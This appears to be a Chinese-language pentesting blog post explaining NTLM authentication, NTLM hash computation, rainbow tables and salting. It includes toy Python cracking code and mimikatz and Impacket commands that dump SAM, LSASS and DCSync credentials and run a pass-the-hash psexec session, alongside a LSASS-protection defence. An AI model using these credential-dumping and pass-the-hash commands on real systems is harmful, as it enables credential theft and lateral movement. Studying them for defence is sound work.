---
title: "NTLM协议&攻击手法"
author: "bx"
description: "深入分析NTLM协议及其常见的攻击手法，包括NTLM中继、哈希传递等，并提供相应的防御策略。"
pubDatetime: "2025-09-05"
tags:
  - "NTLM"
  - "Active Directory"
  - "Cyber Security"
  - "Pentesting"
draft: false
slug: "ntlm-protocol-and-attack-techniques"
---
<meta name="referrer" content="no-referrer">


# NTLM协议&攻击手法

创建时间: 2025年9月11日 16:56

## NTLM协议

NTLM 协议概述

**NTLM (NT LAN Manager)** 是微软早期的身份认证协议，最初用于 Windows NT 时代，现在仍然存在于 Windows 系统中，主要是为了 **兼容性**。

原理主要是三步走

- **Negotiate（协商）**
    - 客户端告诉服务器：“我支持 NTLM 协议”。
- **Challenge（质询）**
    - 服务器生成一个随机数 `Nonce`，发给客户端。
- **Response（响应）**
    - 客户端用用户密码的 **NTLM Hash** 对这个随机数进行加密，得到 `Response`。
    - 客户端把 `Response` 发送给服务器。
    - 服务器用保存的用户 NTLM Hash 也做同样的计算，如果结果匹配，就证明客户端知道密码。

Kerberos
Kerberos是一种广泛使用的网络认证协议，它主要用于在不安全的网络环境中，为客户端和服务器提供安全的身份验证。它的核心思想是使用一个可信任的第三方来验证通信双方的身份。
核心特点
基于票据（Ticket-based） 的认证协议。

特点就是

- **不传密码本身**：整个认证过程中不会出现明文密码。
- **基于密码的哈希**：用密码的哈希值（NT Hash）参与加密。
- **抗窃听**：即使网络被抓包，攻击者拿到的只是 `Challenge` 和 `Response`，不能直接拿来登录（除非做中继攻击或破解哈希）。

NTLM Hash的实现

整体逻辑如下

```jsx
明文密码 → UTF-16LE编码 → MD4哈希 → 十六进制大写 → NTLM哈希
```

具体Py实现：自己写的很随意

```python
import hashlib
import struct

def md4(data):
    """
    手动实现MD4算法（因为新版本Python移除了MD4支持）
    """
    # MD4算法的辅助函数
    def f(x, y, z): return (x & y) | (~x & z)
    def g(x, y, z): return (x & y) | (x & z) | (y & z)
    def h(x, y, z): return x ^ y ^ z
    
    def rotleft(value, shift):
        return ((value << shift) | (value >> (32 - shift))) & 0xffffffff
    
    # 初始化MD4状态
    h0, h1, h2, h3 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    
    # 预处理消息
    msg = bytearray(data)
    msg_len = len(data)
    msg.append(0x80)
    
    # 填充到56字节（mod 64）
    while len(msg) % 64 != 56:
        msg.append(0)
    
    # 添加原始长度（64位小端序）
    msg.extend(struct.pack('<Q', msg_len * 8))
    
    # 处理512位块
    for i in range(0, len(msg), 64):
        chunk = msg[i:i+64]
        w = list(struct.unpack('<16I', chunk))
        
        a, b, c, d = h0, h1, h2, h3
        
        # 第1轮
        s = [3, 7, 11, 19]
        for j in range(16):
            k = j
            a, b, c, d = d, rotleft((a + f(b, c, d) + w[k]) & 0xffffffff, s[j % 4]), b, c
        
        # 第2轮
        s = [3, 5, 9, 13]
        for j in range(16):
            k = (4 * j + j // 4) % 16
            a, b, c, d = d, rotleft((a + g(b, c, d) + w[k] + 0x5a827999) & 0xffffffff, s[j % 4]), b, c
        
        # 第3轮
        s = [3, 9, 11, 15]
        order = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]
        for j in range(16):
            k = order[j]
            a, b, c, d = d, rotleft((a + h(b, c, d) + w[k] + 0x6ed9eba1) & 0xffffffff, s[j % 4]), b, c
        
        # 更新哈希值
        h0 = (h0 + a) & 0xffffffff
        h1 = (h1 + b) & 0xffffffff
        h2 = (h2 + c) & 0xffffffff
        h3 = (h3 + d) & 0xffffffff
    
    # 返回最终哈希值
    return struct.pack('<4I', h0, h1, h2, h3)

# md4被删除了
def hash_ntlm(password):
    pass_utf16le = password.encode("utf-16le")
    md4_a = md4(pass_utf16le)
    return md4_a.hex().upper()

if __name__ == "__main__":
    demo = "bx33661"
    res = hash_ntlm(demo)
    print(res)
```

这里得到的结果如下

```python
@bx  /usr/bin/python3 /home/bx/文档/ntlm_hash.py
928502A1D17A400BEABCFCE5DB2AEB11
```

其实从实现来说，我们可以明显看到弱点所在

就是

- 没有盐值（salt），容易被彩虹表攻击
- MD4算法相对较弱
- 不使用密钥拉伸

**NTLM Hash存放一般以下两个位置**

从流程中我们可以发现整个认证过程依赖的是**NTLM Hash**，而不是明文密码

- **SAM文件:** 对于本地账户，Hash存储在 `C:\Windows\System32\config\SAM` 文件中。这个文件在系统运行时是锁定的。

```bash
# mimikatz
lsadump::sam
```

- **LSASS进程内存:** 当用户登录系统后（无论是本地登录、远程桌面还是运行服务），为了方便后续的认证，系统会将该用户的凭据（包括NTLM Hash）缓存在一个名为`lsass.exe`（Local Security Authority Subsystem Service）的进程内存中。**这是PtH攻击最主要的Hash来源。**

```bash
#mimikatz
privilege::debug sekurlsa::logonpasswords
```

- **DCSync**

模拟域控制器的复制请求，从 DC 拉取用户 Hash。

```bash
mimikatz
lsadump::dcsync /user:DOMAIN\Administrator
```

根据我们上面说的逻辑

## Attack

### 彩虹表攻击

要理解彩虹表的核心，比较学术的解释

彩虹表的核心思想是**不存储所有的哈希值**，而是通过一种巧妙的方式只存储“链”的开始和结束。

它包含两个关键函数：

- **哈希函数 (H)**: 如 `H(password) = hash_value`
- **归约函数 (R)**: 它的作用很特别，能将一个哈希值“归约”成一个看起来像密码的字符串。**注意：这个归约函数并不需要是哈希函数的逆函数**，它只是一个格式转换函数。例如，它可以把哈希值的前8个字符作为新的“密码”。

但是说实话第一次接触很难理解

彩虹表攻击的优点在哪里？跟暴力破解有什么区别？为什么它行？

彩虹表是一个生成链+彩虹存储

1. 生成链原理
- 选一个初始密码，比如 `aaaaaa`。
- 计算它的哈希值: `H("aaaaaa")` -> `hash1`
- 用归约函数处理这个哈希值: `R(hash1)` -> `pwd2`
- 再计算新密码的哈希值: `H(pwd2)` -> `hash2`
- 再归约: `R(hash2)` -> `pwd3`
- ... 重复这个过程几千次，形成一条“密码-哈希”交替的链。

`aaaaaa --(H)--> hash1 --(R)--> pwd2 --(H)--> hash2 --(R)--> ... --(H)--> final_hash`

2.构建这个彩虹表

只存储每个链子的起始密码 + 最终hash

然后大数目的这样链子就构成了彩虹表

| **起始密码** | **最终哈希** |
| --- | --- |
| `aaaaaa` | `hash_A_end` |
| `bbbbbb` | `hash_B_end` |
| `cccccc` | `hash_C_end` |
| ... | ... |
|  |  |

那具体怎么去查询和利用这个彩虹表呢

1. **拿来目标哈希**。
2. **反复对它和它的后续计算结果执行 `R -> H` 变换**，并将每次的结果与彩虹表中所有的**“最终哈希”**进行比较。
3. **一旦匹配成功**，就找到了目标所在的链条。
4. **从该链条的“起始密码”开始**，重新执行 `H -> R -> H ...` 的计算过程。
5. **在重算过程中，将每一个生成的哈希值与目标哈希进行比较**。
6. **当两者相同时，前一步的那个密码就是最终答案**。

彩虹表脚本生成

这里按照彩虹表的核心思考

```python
import hashlib
import string
import random

PASSWORD_LENGTH = 4
CHARSET = string.ascii_lowercase
CHAIN_LENGTH = 400
NUM_CHAINS = 4000

def hash_function(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

# 写一个归约函数
def reduction_func(hash_v,index):
    inthash = int(hash_v,16)
    inthash += index
    password = ""

    for _ in range(PASSWORD_LENGTH):
        password += CHARSET[inthash % len(CHARSET)]
        inthash //= len(CHARSET)
    return password

def generate_rainbow_table():
    print("=====生成彩虹表=====")
    rainbow_table = {}
    for i in range(NUM_CHAINS):
        # 初始密码
        start_password = ''.join(random.choice(CHARSET) for _ in range(PASSWORD_LENGTH))
        current_password = start_password
        for j in range(CHAIN_LENGTH):
            hash_val = hash_function(current_password)
            current_password = reduction_func(hash_val,j)
        
        end_hash = hash_function(current_password)

        rainbow_table[start_password] = end_hash
        if (i + 1) % (NUM_CHAINS // 10) == 0:
            print(f"已生成 {i + 1}/{NUM_CHAINS} 条链...")
    
    print("=====彩虹表生成完毕=====")
    return rainbow_table

def crack_password(target_hash, rainbow_table):
    """尝试使用彩虹表破解给定的哈希"""
    print(f"--- 目标哈希: {target_hash} ---")
    print("--- 开始破解... ---")

    # 阶段一：查找链条
    # 从链的末端开始，逐个位置向前尝试
    for i in range(CHAIN_LENGTH - 1, -1, -1):
        temp_hash = target_hash
        
        # 从目标哈希开始，执行 R->H 操作，直到链的末端
        for j in range(i, CHAIN_LENGTH):
            password = reduction_func(temp_hash, j)
            temp_hash = hash_function(password)
        
        # 检查计算出的最终哈希是否存在于彩虹表中
        for start_password, end_hash in rainbow_table.items():
            if temp_hash == end_hash:
                print(f"匹配成功！哈希可能在以 '{start_password}' 开头的链中。")
                
                # 阶段二：验证并找到密码
                # 从找到的链的起点开始，重现整条链
                current_password = start_password
                for k in range(CHAIN_LENGTH):
                    current_hash = hash_function(current_password)
                    if current_hash == target_hash:
                        # 找到了！
                        print(f"\n*** 破解成功！密码是: {current_password} ***")
                        return current_password
                    # 继续链的下一个环节
                    current_password = reduction_func(current_hash, k)
    
    print("\n--- 破解失败，密码不在彩虹表中。 ---")
    return None

    

if __name__ == "__main__":
    rainbow_table = generate_rainbow_table()

    original_password = "love"
    target_hash_to_crack = hash_function(original_password)

    crack_password(target_hash_to_crack,rainbow_table)

    print("完成！！！")

```

这里需要调高这个,让尽可能覆盖到

```powershell
CHAIN_LENGTH = 400
NUM_CHAINS = 4000
```

最后程序响应结果

```powershell
=====生成彩虹表=====
已生成 400/4000 条链...
已生成 800/4000 条链...
已生成 1200/4000 条链...
已生成 1600/4000 条链...
已生成 2000/4000 条链...
已生成 2400/4000 条链...
已生成 2800/4000 条链...
已生成 3200/4000 条链...
已生成 3600/4000 条链...
已生成 4000/4000 条链...
=====彩虹表生成完毕=====
--- 目标哈希: b5c0b187fe309af0f4d35982fd961d7e ---
--- 开始破解... ---
匹配成功！哈希可能在以 'zola' 开头的链中。

*** 破解成功！密码是: love ***
完成！！！
```

这里这个脚本只作为这个概念验证

展示了核心思路

```powershell
明文 → 哈希 → 归约 → 明文 → 哈希 → …
```

最后我们就能真正去理解到这个整个过程

- **对目标 hash 反复做 `归约函数 → 哈希`，推演出可能的链尾 hash**。
- **检查是否等于表中某个 end_hash**
    - 如果推演出的 hash 在彩虹表的 `end_hash` 里有匹配，就说明目标 hash **可能在那条链中**。
    - 这时记住候选起点（链头密码）。
- **验证阶段（重放链）**
    - 从那个候选起点开始，把整条链真正跑一遍（哈希→归约→哈希→...）。
    - 在链中找到和目标 hash 相等的地方，就能得到对应的明文密码。
    - 如果重放时没碰到目标 hash，那说明这是个“假匹配”，要继续尝试别的。

### 加盐的原理

上面彩虹表我们学习，具体加盐的原理，学习过这个现代密码学的了解到，具体公式如下

```powershell
hash = H(password + salt)
```

彩虹表的本质是提前预计算 **所有可能的明文密码 → 哈希** 的映射

攻击者就必须针对 **每个 salt 单独生成彩虹表**，代价指数级膨胀,那么彩虹表的攻击也就没有必要了
但是对于固定盐和可预测盐的话，其实跟没加是差不多的

这里对于安全规则而言，需要的是随机盐

这里一个概念性的脚本

```python
import hashlib
import os

def salted_hash(password,salt:str=None):
    if salt is None:
        salt = os.urandom(16).hex()
    hash_val = hashlib.sha256((password + salt).encode()).hexdigest()
    return hash_val, salt

if __name__ == "__main__":
    pwd = "bx33661"
    hash_val, salt = salted_hash(pwd)
    print("保存的哈希:", hash_val)
    print("保存的盐  :", salt)

    # 验证
    hash_val_check, _ = salted_hash(pwd, salt)
    print("验证结果:", hash_val == hash_val_check)
```

结果如下

```python
"C:\Program Files\Python312\python.exe" C:\Users\bx336\Desktop\HTB\ntlm\rainbow\salt_hash.py 
保存的哈希: da59c617b69f5ef217777810700934d9e6b89013a705aa14062d33148a66a103
保存的盐  : c1d1b85839f14eed150da0c94e1bd8bf
验证结果: True

进程已结束，退出代码为 0

```

### PTH攻击

一般攻流程

所以一般来讲，一个典型的域环境 PTH 攻击流程：

1. **拿到域内主机**（可以低权限）。
2. **提取 LSASS 或 SAM 中的 Hash**。
3. **使用 PTH 工具发起会话**：
- Windows 自带：

```
runas /netonly /user:DOMAIN\Administrator cmd
```

- Impacket：

```
python3 psexec.py DOMAIN/Administrator@TARGET -hashes <LMhash>:<NThash>
```

1. 继续移动。

### 防御措施

- 禁用 NTLM 或限制 NTLM 使用（用 Kerberos 代替）。
- 启用 **LSASS 保护（RunAsPPL）**：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

### 简化认证流程

1. 客户端发起请求。
2. 服务器发送一个随机 **Challenge**（8 字节）。
3. 客户端用 **NTLM Hash + Challenge** 计算出 Response。
4. 服务器把 Response 交给域控制器（或本地 SAM 数据库）验证。

**弱点**

- **Hash 即凭据** → 拿到 Hash 就能认证（PTH 攻击核心）。
- 无法抵抗重放攻击（除非 Challenge 是一次性且短时有效）。
- 没有强加密的会话票据，安全性低于 Kerberos。

### Impacke 套件

Impacket 是一个内网渗透的“命令行航母”，它将复杂的Windows网络协议攻击封装成了简单易用的脚本

简单的说， Impacket是一个用Python编写的、用于处理网络协议的类库集合

[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

### mimikatz 猕猴桃

[https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

常用操作

**提升权限**

```
privilege::debug
```

**导出系统凭据:**

```
sekurlsa::logonpasswords
```

**导出SAM数据库:**

```
lsadump::sam
```

**导出缓存的域凭据:**

```
lsadump::cache
```

**Kerberos票据操作:**

```
sekurlsa::tickets
kerberos::list
```

**导出NTDS.dit (域控制器):**

```
lsadump::dcsync /user:Administrator
```

## 参考文章

[https://www.cnblogs.com/kalixcn/p/18138330](https://www.cnblogs.com/kalixcn/p/18138330)

[https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/)
